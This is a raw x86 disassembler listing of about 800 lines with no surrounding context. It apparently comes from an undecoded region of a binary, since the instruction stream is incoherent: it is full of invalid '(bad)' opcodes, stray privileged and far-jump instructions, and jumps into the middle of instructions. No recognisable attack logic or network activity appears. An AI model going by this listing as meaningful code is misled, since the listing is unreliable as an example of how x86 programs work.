  401878:	aas    
  401879:	sub    eax,0x912c4c50
  40187e:	inc    esp
  40187f:	sbb    esi,edx
  401881:	pop    edi
  401882:	xchg   edi,eax
  401883:	push   0x1dee6e27
  401888:	mov    dl,bh
  40188a:	pop    eax
  40188b:	leave  
  40188c:	pushf  
  40188d:	lds    esi,FWORD PTR [ebx+ebp*1+0x567cb5fa]
  401894:	inc    esi
  401895:	mov    fs,ecx
  401897:	retf   0x9d1c
  40189a:	mov    DWORD PTR [eax+0x14db2724],0x20088d68
  4018a4:	xchg   ebx,eax
  4018a5:	ins    DWORD PTR es:[edi],dx
  4018a6:	dec    ebx
  4018a7:	mov    WORD PTR [ecx+0x70],?
  4018aa:	mov    DWORD PTR [edi+0x3dd1c85a],edx
  4018b0:	lar    eax,WORD PTR [edx]
  4018b3:	(bad)  
  4018b4:	retf   
  4018b5:	leave  
  4018b6:	xchg   ebx,eax
  4018b7:	adc    DWORD PTR [edx+0x44],edx
  4018ba:	pop    ebp
  4018bb:	and    al,0xe
  4018bd:	adc    DWORD PTR [ecx],0x256029ec
  4018c3:	loope  0x401929
  4018c5:	push   es
  4018c6:	mov    ds:0x1a5e9ed6,eax
  4018cb:	and    DWORD PTR [edi+0x11],0xd
  4018cf:	and    eax,0xb6405e3b
  4018d4:	aad    0xaf
  4018d6:	and    DWORD PTR [ebx-0x74],0xb739e6fc
  4018dd:	jmp    0x401954
  4018df:	add    eax,0x37bccc93
  4018e4:	shl    DWORD PTR [edx+0x693a4a43],cl
  4018ea:	lea    eax,[esi+0xfa59f06]
  4018f0:	call   0xd69a:0xfc78cb76
  4018f7:	sti    
  4018f8:	jge    0x40192f
  4018fa:	xchg   esi,eax
  4018fb:	push   es
  4018fc:	inc    esp
  4018fd:	je     0x4018d1
  4018ff:	aad    0x88
  401901:	jmp    0x7878:0xe4cfff30
  401908:	test   eax,0x9037de96
  40190d:	xor    edx,DWORD PTR [ebp+0x3]
  401910:	xchg   ecx,eax
  401911:	fwait
  401912:	(bad)  
  401913:	dec    edx
  401914:	mov    eax,ds:0x6924e104
  401919:	fisub  DWORD PTR [edi]
  40191b:	cmp    DWORD PTR [ebx+edi*2+0x2a34bf85],0x2c
  401923:	push   ebx
  401924:	mov    ebp,cs
  401926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401927:	repz adc esi,0x2f
  40192b:	push   0x6a9a6c7c
  401930:	cmp    ebp,DWORD PTR [ecx+0x6440b169]
  401936:	inc    esp
  401937:	inc    ebx
  401938:	shl    ah,1
  40193a:	push   es
  40193b:	out    0xb,al
  40193d:	arpl   WORD PTR [edx-0x13],sp
  401940:	dec    esp
  401941:	or     DWORD PTR [ecx],0x97e1313d
  401947:	test   BYTE PTR [eax-0x14fdad5b],0x97
  40194e:	inc    ebx
  40194f:	out    0x25,eax
  401951:	stos   DWORD PTR es:[edi],eax
  401952:	hlt    
  401953:	stos   BYTE PTR es:[edi],al
  401954:	dec    eax
  401955:	jmp    0x401974
  401957:	inc    ebp
  401958:	jecxz  0x4019cb
  40195a:	and    BYTE PTR [ebp+0x10d089ae],0xa4
  401961:	out    dx,al
  401962:	int    0x5f
  401964:	pop    eax
  401965:	xor    ebx,eax
  401967:	or     al,0x63
  401969:	xor    al,0x8
  40196b:	dec    ebp
  40196c:	fstp   st(0)
  40196e:	xor    eax,DWORD PTR [edi+0x4f]
  401971:	loop   0x401938
  401973:	pop    edx
  401974:	fs push edi
  401976:	jnp    0x4019af
  401978:	scas   eax,DWORD PTR es:[edi]
  401979:	ds or  bh,bh
  40197c:	xor    DWORD PTR [esi-0x5e],ebp
  40197f:	push   ds
  401980:	fcomp  DWORD PTR [esi-0x2a782a7b]
  401986:	and    DWORD PTR [eax+edx*8],edx
  401989:	shl    BYTE PTR [esi-0x28],cl
  40198c:	jmp    0x40194a
  40198e:	or     edx,DWORD PTR [eax+edx*4]
  401991:	and    DWORD PTR [ebp-0x16],0xbd903035
  401998:	clc    
  401999:	add    esi,DWORD PTR [edx]
  40199b:	sbb    bl,BYTE PTR [eax-0x6f6b9293]
  4019a1:	out    dx,eax
  4019a2:	pop    esp
  4019a3:	jmp    0xafce60c8
  4019a8:	xor    BYTE PTR [ecx+0x66],0xce
  4019ac:	and    BYTE PTR [esi-0x6cf0d89a],ah
  4019b2:	popa   
  4019b3:	dec    esp
  4019b4:	and    DWORD PTR [ebp+0x5f],ebx
  4019b7:	ss cmp eax,0x4623620f
  4019bd:	ss retf 0xc0ee
  4019c1:	scas   eax,DWORD PTR es:[edi]
  4019c2:	and    eax,0xec26bebd
  4019c7:	lods   eax,DWORD PTR ds:[esi]
  4019c8:	sub    ebx,DWORD PTR [ecx+0x31]
  4019cb:	push   esi
  4019cc:	sahf   
  4019cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019cf:	repnz in al,0xfd
  4019d2:	cmp    al,0x62
  4019d4:	cmp    al,0x23
  4019d6:	push   esi
  4019d7:	retf   0xa3db
  4019da:	mov    edi,0xb712dd8
  4019df:	adc    BYTE PTR [eax+0x26103c3c],bl
  4019e5:	in     eax,dx
  4019e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019e7:	jmp    0x4019bd
  4019e9:	ja     0x4019c8
  4019eb:	adc    ebx,ebx
  4019ed:	push   ebp
  4019ee:	add    ah,BYTE PTR [eax+0x41fad95b]
  4019f4:	fs mov dl,0xba
  4019f7:	mov    ds:0x94afc103,al
  4019fc:	cdq    
  4019fd:	cmp    DWORD PTR [edi+0x2f],0x94152e00
  401a04:	and    BYTE PTR [esi-0x6e],dh
  401a07:	fidiv  WORD PTR [esi]
  401a09:	pop    ecx
  401a0a:	adc    ebp,DWORD PTR [ecx]
  401a0c:	add    edx,DWORD PTR [edx+0x3755aba4]
  401a12:	xor    ecx,DWORD PTR [esi]
  401a14:	jmp    0x401a64
  401a16:	call   0x4de16ebf
  401a1b:	mov    WORD PTR [ecx+0x41982911],fs
  401a21:	add    dh,BYTE PTR [ebp+edi*1+0x1056e467]
  401a28:	jb     0x401a0d
  401a2a:	jno    0x401a6c
  401a2c:	(bad)  
  401a2d:	inc    esp
  401a2e:	sti    
  401a2f:	xor    bl,BYTE PTR [edi-0x7e1043b2]
  401a35:	sub    ch,al
  401a37:	cmp    esp,0x88e60e97
  401a3d:	jp     0x401a8b
  401a3f:	daa    
  401a40:	aad    0x83
  401a42:	shl    BYTE PTR [edi+0x4f],1
  401a45:	mov    eax,0x38176ff1
  401a4a:	dec    edi
  401a4b:	cli    
  401a4c:	dec    ebp
  401a4d:	push   ecx
  401a4e:	and    DWORD PTR [ebx],eax
  401a50:	mov    ds:0x9df173fe,al
  401a55:	and    DWORD PTR [eax-0x4a1ee0a2],0xefd9780
  401a5f:	arpl   sp,bp
  401a61:	retf   0x200
  401a64:	out    dx,al
  401a65:	push   ss
  401a66:	jae    0x401a04
  401a68:	pop    es
  401a69:	hlt    
  401a6a:	mov    ds:0x5174e01d,eax
  401a6f:	shr    dl,cl
  401a71:	aaa    
  401a72:	cmp    DWORD PTR [ebp+0x25b4f088],ebp
  401a78:	inc    eax
  401a79:	or     al,0xc8
  401a7b:	ficomp WORD PTR [eax+0x2cbff29f]
  401a81:	push   es
  401a82:	das    
  401a83:	pusha  
  401a84:	lea    ecx,[esi-0x33f6abe6]
  401a8a:	dec    ebx
  401a8b:	jl     0x401a52
  401a8d:	add    al,0xdd
  401a8f:	and    eax,0x4a3481e
  401a94:	push   edx
  401a95:	mov    cl,dl
  401a97:	or     eax,0xfc84ee23
  401a9c:	pop    ss
  401a9d:	sbb    eax,0xe2be2206
  401aa2:	xlat   BYTE PTR ds:[ebx]
  401aa3:	dec    esi
  401aa4:	icebp  
  401aa5:	rcl    BYTE PTR [esi-0x1393a314],cl
  401aab:	repz call 0x24e74bbf
  401ab1:	xor    eax,DWORD PTR [ecx+0x3ef8c5b2]
  401ab7:	jmp    0x39a73249
  401abc:	(bad)  
  401abd:	fsubr  QWORD PTR [edi]
  401abf:	push   edi
  401ac0:	push   edi
  401ac1:	loope  0x401a72
  401ac3:	retf   0xd221
  401ac6:	xchg   ebp,eax
  401ac7:	aad    0xc8
  401ac9:	pop    ecx
  401aca:	xor    BYTE PTR [edi],bl
  401acc:	jno    0x401b0d
  401ace:	or     ebx,ebx
  401ad0:	push   0x6e
  401ad2:	rcl    DWORD PTR cs:[edi-0x6c7e5001],cl
  401ad9:	xlat   BYTE PTR ds:[ebx]
  401ada:	and    eax,0x52834e64
  401adf:	dec    edi
  401ae0:	scas   al,BYTE PTR es:[edi]
  401ae1:	pop    ebx
  401ae2:	xor    BYTE PTR [ebx-0x1c1bf333],ch
  401ae8:	imul   eax,DWORD PTR [eax-0x31],0xffffff82
  401aec:	jmp    0x8da980d2
  401af1:	add    al,0x6d
  401af3:	and    bh,ch
  401af5:	call   0x2eb7:0xafc9b177
  401afc:	ss retf 
  401afe:	fnstcw WORD PTR [edx+0x58]
  401b01:	sbb    DWORD PTR ds:0x58685b4e,edi
  401b07:	add    DWORD PTR [ebp-0x275ee720],edx
  401b0d:	jae    0x401b84
  401b0f:	mov    WORD PTR [esi],fs
  401b11:	dec    edx
  401b12:	mov    ds:0x150db698,eax
  401b17:	jge    0x401b02
  401b19:	aas    
  401b1a:	retf   0x42f1
  401b1d:	xchg   ecx,eax
  401b1e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b20:	js     0x401b06
  401b22:	and    eax,0xc21ac70a
  401b27:	clc    
  401b28:	cdq    
  401b29:	je     0x401b59
  401b2b:	sub    ebp,DWORD PTR [ecx-0x575f7363]
  401b31:	jle    0x401b82
  401b33:	in     eax,dx
  401b34:	test   eax,0x366263f0
  401b39:	mov    ah,0x7c
  401b3b:	adc    ecx,edx
  401b3d:	dec    ebp
  401b3e:	jb     0x401af1
  401b40:	pop    ecx
  401b41:	xor    bl,dl
  401b43:	in     al,dx
  401b44:	xchg   ebx,eax
  401b45:	jmp    0x401b0f
  401b47:	xchg   DWORD PTR [ebx],ecx
  401b49:	loopne 0x401af2
  401b4b:	xchg   ebx,eax
  401b4c:	mov    eax,DWORD PTR [esi-0x287d2c2f]
  401b52:	out    0x83,eax
  401b54:	sub    BYTE PTR [edi],ch
  401b56:	or     DWORD PTR [eax],0xe1930af3
  401b5c:	in     al,dx
  401b5d:	and    al,0xdc
  401b5f:	cmp    edi,ecx
  401b61:	mov    ah,0x43
  401b63:	shl    BYTE PTR [ebx-0x1463518a],1
  401b69:	and    DWORD PTR [eax],edi
  401b6b:	add    eax,0xf49c2123
  401b70:	cli    
  401b71:	sbb    eax,0x762a24f9
  401b76:	pop    ebx
  401b77:	cmc    
  401b78:	ja     0x401ba0
  401b7a:	std    
  401b7b:	mov    eax,0x97e9e23d
  401b80:	(bad)  
  401b82:	mov    edi,0xd93485a2
  401b87:	add    BYTE PTR [ebx-0x7b],0x6e
  401b8b:	fisttp QWORD PTR [ecx]
  401b8d:	jmp    0x401b7f
  401b8f:	sti    
  401b90:	test   DWORD PTR [edx],eax
  401b92:	cs push ebx
  401b94:	jbe    0x401bf8
  401b96:	fwait
  401b97:	out    dx,al
  401b98:	cmp    eax,0xa941f565
  401b9d:	push   es
  401b9e:	cs (bad) 
  401ba0:	xor    al,0x24
  401ba2:	xchg   edi,eax
  401ba3:	imul   edx,edi,0x1e492d18
  401ba9:	(bad)  
  401baa:	jmp    0x401bb5
  401bac:	push   ebp
  401bad:	lea    edi,[eax]
  401baf:	mov    ch,bl
  401bb1:	call   0xd02d5ca2
  401bb6:	xchg   BYTE PTR [ebp+0x7a],dh
  401bb9:	imul   ecx,DWORD PTR [edi+ebx*4+0x485a162],0xffffffdb
  401bc1:	mov    ds:0x58c6551a,al
  401bc6:	(bad)
  401bc9:	xor    al,0xb8
  401bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bcc:	fild   WORD PTR [ecx-0x1a70ea26]
  401bd2:	ins    DWORD PTR es:[edi],dx
  401bd3:	jmp    FWORD PTR [edi+esi*1+0x38852992]
  401bda:	xchg   edi,eax
  401bdb:	outs   dx,DWORD PTR ds:[esi]
  401bdc:	mov    esp,0x68576269
  401be1:	test   DWORD PTR [edi],edx
  401be3:	fsub   QWORD PTR [ebp+0x4e]
  401be6:	jae    0x401ba7
  401be8:	mov    edi,0x31b1c9af
  401bed:	xchg   DWORD PTR [edx+0x8],eax
  401bf0:	test   BYTE PTR [ecx],cl
  401bf2:	xlat   BYTE PTR ds:[ebx]
  401bf3:	xchg   esp,eax
  401bf4:	push   DWORD PTR [edi+0x24840a67]
  401bfa:	push   ss
  401bfb:	ficomp DWORD PTR [ecx]
  401bfd:	clc    
  401bfe:	push   0x97025e6c
  401c03:	cli    
  401c04:	dec    eax
  401c05:	loope  0x401bd7
  401c07:	pop    ebx
  401c08:	imul   dl
  401c0a:	ret    
  401c0b:	scas   eax,DWORD PTR es:[edi]
  401c0c:	jle    0x401b9e
  401c0e:	pop    edi
  401c0f:	js     0x401bd2
  401c11:	imul   edx,DWORD PTR [ebp-0x77071b37],0x7d872eb1
  401c1b:	and    DWORD PTR [ebx],eax
  401c1d:	mov    ebx,0x9e37b949
  401c22:	test   al,0xae
  401c24:	cld    
  401c25:	jecxz  0x401c49
  401c27:	jae    0x243bb780
  401c2d:	xchg   edi,eax
  401c2e:	xor    eax,0xed82c074
  401c33:	push   0x18e6046b
  401c38:	test   esi,ebp
  401c3a:	mov    DWORD PTR ds:0x746c88e9,eax
  401c40:	push   edi
  401c41:	enter  0x70c5,0x5
  401c45:	jae    0x401c71
  401c47:	pop    esp
  401c48:	xor    ch,BYTE PTR [esi+0xc]
  401c4b:	xor    eax,0xd0ed3b30
  401c50:	dec    edi
  401c51:	pop    esi
  401c52:	rol    BYTE PTR [eax+ebx*1+0x2561185e],cl
  401c59:	in     al,0xe2
  401c5b:	push   eax
  401c5c:	les    esp,FWORD PTR ss:[ebp-0x37c01647]
  401c63:	dec    ebx
  401c64:	xchg   edx,eax
  401c65:	mov    edx,0x4b000d84
  401c6a:	dec    edi
  401c6b:	and    DWORD PTR [esi+0x2e],esp
  401c6e:	cmc    
  401c6f:	mov    al,ds:0xee06a2b
  401c74:	pop    ebx
  401c75:	je     0x401c48
  401c77:	push   esi
  401c78:	mov    al,ds:0xef4cd813
  401c7d:	dec    esi
  401c7e:	jl     0x401cb2
  401c80:	rcr    DWORD PTR [esi-0x57ef9e80],0x5b
  401c87:	mov    bh,0xe4
  401c89:	or     BYTE PTR [ebp+0x23],cl
  401c8c:	ret    0xca80
  401c8f:	mov    ecx,0x8bbfd0c4
  401c94:	pushf  
  401c95:	mov    al,ds:0x5a669639
  401c9a:	lahf   
  401c9b:	jno    0x401cc0
  401c9d:	or     BYTE PTR [edx+0x157bd5f],ah
  401ca3:	ds jne 0x401cf3
  401ca6:	mov    esi,0x6322d2f
  401cab:	ins    DWORD PTR es:[edi],dx
  401cac:	fldcw  WORD PTR [ebp-0x73b199f7]
  401cb2:	rol    BYTE PTR [esi+0x65],1
  401cb5:	lahf   
  401cb6:	rol    dl,1
  401cb8:	scas   eax,DWORD PTR es:[edi]
  401cb9:	scas   eax,DWORD PTR es:[edi]
  401cba:	adc    ah,BYTE PTR [esi]
  401cbc:	mov    al,0x80
  401cbe:	xor    edi,ecx
  401cc0:	fstp   DWORD PTR [esi-0x5c]
  401cc3:	add    ebx,DWORD PTR [ecx]
  401cc5:	ins    DWORD PTR es:[edi],dx
  401cc6:	sub    dh,dl
  401cc8:	sbb    DWORD PTR [esi+ebx*1-0x50],ecx
  401ccc:	inc    ecx
  401ccd:	mov    dh,0xfe
  401ccf:	test   DWORD PTR [eiz*1+0x3196bd93],ebp
  401cd6:	nop
  401cd7:	cmp    al,0xbc
  401cd9:	xor    edx,DWORD PTR [ecx-0x44]
  401cdc:	and    eax,0x71a50751
  401ce1:	pop    ecx
  401ce2:	fst    st(2)
  401ce4:	lods   eax,DWORD PTR ds:[esi]
  401ce5:	pushf  
  401ce6:	fisub  DWORD PTR [eax]
  401ce8:	je     0x401d15
  401cea:	enter  0x4a1b,0x66
  401cee:	cli    
  401cef:	test   eax,0xd0f0f66
  401cf4:	fstp   TBYTE PTR [ebx]
  401cf6:	and    al,0xb3
  401cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cf9:	mov    ds:0xe4862094,eax
  401cfe:	cmp    al,0xd4
  401d00:	repz or dh,0xc7
  401d04:	mov    esi,0xffbcff65
  401d09:	dec    ebp
  401d0a:	fwait
  401d0b:	mov    bl,0x12
  401d0d:	mov    edx,0x7b63881e
  401d12:	mov    ds:0xabcf188e,al
  401d17:	mov    cs:0x8ce3cf1d,eax
  401d1d:	(bad)  
  401d1e:	sbb    eax,0x50d23e22
  401d23:	push   cs
  401d24:	cdq    
  401d25:	push   0xab62cf01
  401d2a:	scas   al,BYTE PTR es:[edi]
  401d2b:	ret    0xf517
  401d2e:	sub    edi,edx
  401d30:	repz sahf 
  401d32:	cwde   
  401d33:	shl    eax,1
  401d35:	pop    ss
  401d36:	shl    DWORD PTR [ebx+0x2469ba67],0x5
  401d3d:	dec    ecx
  401d3e:	xchg   edx,eax
  401d3f:	jecxz  0x401d0f
  401d41:	fcomip st,st(3)
  401d43:	imul   eax,eax,0x1707ddf7
  401d49:	jp     0x401db1
  401d4b:	sbb    BYTE PTR [ecx+0x1a],0xea
  401d4f:	or     eax,0x75fc18ff
  401d54:	xchg   BYTE PTR [edi+ebx*4-0x7360a2a9],ch
  401d5b:	pop    ebp
  401d5c:	mov    DWORD PTR [ebx-0x77],edx
  401d5f:	mov    al,ds:0x503ce219
  401d64:	cld    
  401d65:	push   0xf1d3af59
  401d6a:	sub    DWORD PTR [ebp+ebp*4-0x728aa4a3],esp
  401d71:	sub    dh,al
  401d73:	adc    BYTE PTR [eax],0x7
  401d76:	lods   al,BYTE PTR ds:[esi]
  401d77:	and    esi,ebp
  401d79:	pop    ebx
  401d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d7c:	or     al,0x2a
  401d7e:	mov    dl,0xcd
  401d80:	push   0xffffffef
  401d82:	mov    BYTE PTR [ecx-0x2a0dba58],dl
  401d88:	test   edx,edx
  401d8a:	mov    edx,edi
  401d8c:	cmc    
  401d8d:	mov    ebp,0xd74cc6df
  401d92:	dec    edx
  401d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d94:	dec    edi
  401d95:	mov    edx,ds
  401d97:	fs inc esi
  401d99:	xlat   BYTE PTR ds:[ebx]
  401d9a:	retf   0xf737
  401d9d:	pop    esp
  401d9e:	push   esp
  401d9f:	in     al,0xb
  401da1:	fisttp WORD PTR [eax+ebp*4]
  401da4:	jne    0x401dc7
  401da6:	jge    0x401dd5
  401da8:	mov    al,ds:0xe41c41b3
  401dad:	inc    edx
  401dae:	ficom  DWORD PTR [ecx+eax*8+0xf]
  401db2:	aaa    
  401db3:	cdq    
  401db4:	loop   0x401d4c
  401db6:	stc    
  401db7:	icebp  
  401db8:	push   esi
  401db9:	lods   al,BYTE PTR ds:[esi]
  401dba:	xchg   esp,eax
  401dbb:	xchg   ebx,eax
  401dbc:	mov    bh,BYTE PTR [edi]
  401dbe:	push   ecx
  401dbf:	leave  
  401dc0:	rcr    DWORD PTR [ebp-0x5c],cl
  401dc3:	cmp    eax,0x877e1469
  401dc8:	cmp    ecx,DWORD PTR ds:0xf5a3683
  401dce:	cli    
  401dcf:	mov    gs:0x758ab288,eax
  401dd5:	cmp    cl,BYTE PTR [edx+edx*2]
  401dd8:	sub    al,0xf2
  401dda:	sub    BYTE PTR [esi+0x4338c5b2],0xc9
  401de1:	outs   dx,BYTE PTR ds:[esi]
  401de2:	cwde   
  401de3:	inc    ebp
  401de4:	sbb    eax,0x40e06ee4
  401de9:	push   ss
  401dea:	mov    esi,DWORD PTR [eax]
  401dec:	aaa    
  401ded:	or     al,0xf1
  401def:	out    dx,eax
  401df0:	les    edi,FWORD PTR [ebp+0x22b2aa56]
  401df6:	mov    eax,0x1b6acd61
  401dfb:	(bad)  
  401dfc:	fisub  WORD PTR [ecx+0x52]
  401dff:	and    al,0xc3
  401e01:	int    0x32
  401e03:	int    0x23
  401e05:	outs   dx,BYTE PTR ds:[esi]
  401e06:	sar    BYTE PTR [edi+edx*4],1
  401e09:	bnd jb 0x401e2f
  401e0c:	mov    ch,0xeb
  401e0e:	and    eax,0x4b53a97a
  401e13:	in     eax,dx
  401e14:	xchg   esp,eax
  401e15:	jmp    0x66f2:0x59e4fa04
  401e1c:	or     ebp,DWORD PTR [eax-0x30]
  401e1f:	je     0x401dbd
  401e21:	sub    bl,bl
  401e23:	pop    ebx
  401e24:	or     ebx,DWORD PTR [edi-0x2]
  401e27:	ret    0xa9e7
  401e2a:	rcl    BYTE PTR [ebp-0x2bdb7b19],cl
  401e30:	ret    0xa41f
  401e33:	and    edi,0xb80f31de
  401e39:	sub    al,0x59
  401e3b:	iret   
  401e3c:	enter  0x5a33,0xab
  401e40:	lds    esi,FWORD PTR [esi+0x5a]
  401e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e44:	push   esi
  401e45:	int    0x8e
  401e47:	add    BYTE PTR [esp+ecx*2],ah
  401e4a:	cmp    eax,0xfe9e9fcc
  401e4f:	jb     0x401e3e
  401e51:	xchg   ecx,eax
  401e52:	jns    0x401ed2
  401e54:	xchg   esp,eax
  401e55:	push   ecx
  401e56:	inc    ecx
  401e57:	outs   dx,BYTE PTR ds:[esi]
  401e58:	aaa    
  401e59:	add    BYTE PTR [ecx-0x7720733],dh
  401e5f:	xchg   edx,eax
  401e60:	test   BYTE PTR [ebp+0x74152809],bl
  401e66:	pop    ecx
  401e67:	xor    al,0x4
  401e69:	xchg   edi,eax
  401e6a:	adc    cl,ch
  401e6c:	shr    DWORD PTR [ebx-0x31],cl
  401e6f:	dec    ebp
  401e70:	pop    ds
  401e71:	stos   BYTE PTR es:[edi],al
  401e72:	in     al,dx
  401e73:	mov    BYTE PTR [ebx+0x131208ab],bl
  401e79:	pop    ebx
  401e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e7b:	sub    eax,0x67fa7fbc
  401e80:	pop    eax
  401e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e82:	mov    al,0x20
  401e84:	sar    BYTE PTR ds:0x75d8d045,cl
  401e8b:	inc    eax
  401e8c:	(bad)  
  401e8d:	aas    
  401e8e:	shr    BYTE PTR [edi],1
  401e90:	fcmovnbe st,st(0)
  401e92:	mov    ds:0x3e2bafb5,al
  401e97:	xlat   BYTE PTR ds:[ebx]
  401e98:	es ss mov dh,0xfa
  401e9c:	mov    al,0x7d
  401e9e:	mov    ch,0xa9
  401ea0:	test   DWORD PTR fs:[ebx+edi*4+0x69],eax
  401ea5:	inc    eax
  401ea6:	lods   al,BYTE PTR ds:[esi]
  401ea7:	or     BYTE PTR [eax],0x82
  401eaa:	and    BYTE PTR [edi],ch
  401eac:	inc    ebx
  401ead:	cmp    eax,0xeef77b3e
  401eb2:	mov    eax,0x492385b
  401eb7:	jle    0x401efa
  401eb9:	xchg   ebx,eax
  401eba:	inc    ecx
  401ebb:	inc    ebx
  401ebc:	pop    eax
  401ebd:	leave  
  401ebe:	dec    esp
  401ebf:	test   BYTE PTR [edi+0x59],al
  401ec2:	pop    ebp
  401ec3:	cwde   
  401ec4:	cmp    eax,0xcdb707f7
  401ec9:	adc    ebx,ebp
  401ecb:	inc    ecx
  401ecc:	or     DWORD PTR [edx],eax
  401ece:	popa   
  401ecf:	jmp    0xc21f:0x6ad48144
  401ed6:	inc    ebp
  401ed7:	xor    al,0xd7
  401ed9:	dec    ebx
  401eda:	xchg   ecx,eax
  401edb:	in     al,0x30
  401edd:	leave  
  401ede:	dec    esp
  401edf:	push   cs
  401ee0:	scas   eax,DWORD PTR es:[edi]
  401ee1:	icebp  
  401ee2:	xor    BYTE PTR [edx],al
  401ee4:	lods   al,BYTE PTR ds:[esi]
  401ee5:	lods   al,BYTE PTR ds:[esi]
  401ee6:	fsubr  QWORD PTR [ebp+0x7e]
  401ee9:	(bad)  
  401eea:	scas   eax,DWORD PTR es:[edi]
  401eeb:	mov    ebx,0xea888e3a
  401ef0:	inc    esp
  401ef1:	sbb    ecx,DWORD PTR [edx]
  401ef3:	in     al,0x15
  401ef5:	adc    al,0x6e
  401ef7:	sahf   
  401ef8:	and    ch,BYTE PTR [ebx-0x11]
  401efb:	stos   BYTE PTR es:[edi],al
  401efc:	inc    ebp
  401efd:	and    BYTE PTR [edi-0x67],0xd9
  401f01:	adc    DWORD PTR [ebp-0xcfb51b7],0x7ea8bda1
  401f0b:	js     0x401e8e
  401f0d:	jmp    0x41eed544
  401f12:	and    dh,BYTE PTR [esi]
  401f14:	sbb    dh,BYTE PTR [ecx]
  401f16:	test   eax,0xfcc589be
  401f1b:	jge    0x401eae
  401f1d:	jns    0x401efe
  401f1f:	dec    eax
  401f20:	aad    0xc2
  401f22:	mov    edx,0xaf50ce78
  401f27:	dec    ecx
  401f28:	ret    
  401f29:	scas   eax,DWORD PTR es:[edi]
  401f2a:	and    al,0xf8
  401f2c:	pushf  
  401f2d:	and    al,0x5e
  401f2f:	aaa    
  401f30:	fisubr WORD PTR ds:0x85947373
  401f36:	stc    
  401f37:	cmp    al,0xa3
  401f39:	rcr    DWORD PTR [ebx+0x45170bb9],cl
  401f3f:	and    eax,0xd6b1cb74
  401f44:	push   esi
  401f45:	in     eax,dx
  401f46:	dec    ebx
  401f47:	cwde   
  401f48:	add    al,0x73
  401f4a:	popf   
  401f4b:	in     eax,dx
  401f4c:	popa   
  401f4d:	sahf   
  401f4e:	loopne 0x401fcb
  401f50:	jno    0x401f6b
  401f52:	stos   BYTE PTR es:[edi],al
  401f53:	inc    esp
  401f54:	(bad)  [ecx+0x5e]
  401f57:	ins    BYTE PTR es:[edi],dx
  401f58:	mov    ebx,0xcd970336
  401f5d:	jmp    0x9d55:0x6cf04824
  401f64:	sar    DWORD PTR [ebx-0x1f2768b6],cl
  401f6a:	sti    
  401f6b:	loopne 0x401fcb
  401f6d:	jge    0x401f01
  401f6f:	push   0xffffff8e
  401f71:	mov    ch,0xae
  401f73:	into   
  401f74:	and    eax,0xdeab12b9
  401f79:	in     eax,0xb9
  401f7b:	push   cs
  401f7c:	ins    BYTE PTR es:[edi],dx
  401f7d:	sub    eax,0xd68b8cef
  401f82:	lds    ebp,FWORD PTR es:[eax+eax*4-0x30]
  401f87:	mov    ?,WORD PTR [edx]
  401f89:	pop    esi
  401f8a:	lock inc ebx
  401f8c:	xor    bl,0x4e
  401f8f:	scas   eax,DWORD PTR es:[edi]
  401f90:	sbb    BYTE PTR [edx+0x7b],ah
  401f93:	sbb    al,0x44
  401f95:	add    BYTE PTR ds:0x2f68b891,dh
  401f9b:	xchg   edi,eax
  401f9c:	mov    bl,0xff
  401f9e:	and    ebx,edi
  401fa0:	loopne 0x401f43
  401fa2:	adc    bh,BYTE PTR [eax+0x60]
  401fa5:	pop    ebx
  401fa6:	xchg   edi,eax
  401fa7:	fdiv   QWORD PTR ds:0xb06a1a68
  401fad:	in     al,dx
  401fae:	into   
  401faf:	mov    cl,0xee
  401fb1:	dec    edi
  401fb2:	fiadd  WORD PTR [ecx]
  401fb4:	int    0x4b
  401fb6:	mov    ch,BYTE PTR [edi-0x57]
  401fb9:	adc    DWORD PTR [edi+edx*2+0x7d770fb2],esi
  401fc0:	mov    eax,ds:0xaaef9ef8
  401fc5:	jge    0x401fbe
  401fc7:	scas   eax,DWORD PTR es:[edi]
  401fc8:	mov    dl,0x99
  401fca:	and    edi,DWORD PTR [ebp+0x4cd88723]
  401fd0:	mov    dl,0x76
  401fd2:	pop    esp
  401fd3:	dec    ebp
  401fd4:	and    eax,0x63697bf9
  401fd9:	push   0xa650e579
  401fde:	pop    ss
  401fdf:	fisubr DWORD PTR [bp+di-0x2830]
  401fe4:	out    0xb1,al
  401fe6:	into   
  401fe7:	(bad)  
  401fe8:	stc    
  401fe9:	adc    edi,DWORD PTR [eax+0x411e7837]
  401fef:	mov    al,0x82
  401ff1:	stos   DWORD PTR es:[edi],eax
  401ff2:	ja     0x401fa5
  401ff4:	fs jge 0x402010
  401ff7:	xor    DWORD PTR [ebp-0x1fce4771],0x9a237406
  402001:	push   eax
  402002:	stos   BYTE PTR es:[edi],al
  402003:	loopne 0x401f9d
  402005:	scas   eax,DWORD PTR es:[edi]
  402006:	aas    
  402007:	(bad)  
  402008:	fsub   QWORD PTR [ebx-0x6bc8c62b]
  40200e:	enter  0xa40d,0x3d
  402012:	mov    ds:0xaf7e1455,eax
  402017:	(bad)  
  402018:	(bad)  
  402019:	mov    ah,0x10
  40201b:	shl    BYTE PTR [esi],1
  40201d:	sbb    esp,DWORD PTR [ecx+0x1f233e61]
  402023:	jne    0x40204e
  402025:	mov    DWORD PTR [eax-0x21fc827c],0xa916b194
  40202f:	dec    ebp
  402030:	xchg   BYTE PTR [ecx+0x27e56977],dh
  402036:	jp     0x4020a1
  402038:	xlat   BYTE PTR ds:[ebx]
  402039:	xchg   ebp,ecx
  40203b:	stc    
  40203c:	fidivr DWORD PTR [edx]
  40203e:	test   al,0xaa
  402040:	rol    bh,cl
  402042:	jmp    0x5182539d
  402047:	dec    ecx
  402048:	imul   eax,DWORD PTR [eax-0x6759f1de],0x71
  40204f:	rol    BYTE PTR [ebx],cl
  402051:	aam    0x64
  402053:	pop    es
  402054:	pop    ebp
  402055:	mov    DWORD PTR [edi],esp
